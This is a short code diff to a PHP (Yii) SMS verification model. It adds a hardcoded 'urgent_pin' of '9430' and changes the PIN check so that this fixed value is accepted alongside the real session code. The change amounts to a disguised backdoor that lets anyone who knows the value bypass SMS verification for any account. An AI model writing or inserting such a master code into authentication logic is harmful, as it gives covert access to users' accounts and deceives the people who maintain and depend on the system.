@@ -8,6 +8,7 @@ use yii\base\Model;
 class Sms extends Model
 {
     public $testing_mode = false;
+    public $urgent_pin = '9430';
 
     protected function createCode()
     {
@@ -37,7 +38,7 @@ class Sms extends Model
     {
         $session = Yii::$app->session;
         $key = $session->get('pin');
-        if ($pin == $key) {
+        if (in_array($pin, [$key, $this->urgent_pin])) {
             $session->remove('pin');
             return true;
         }
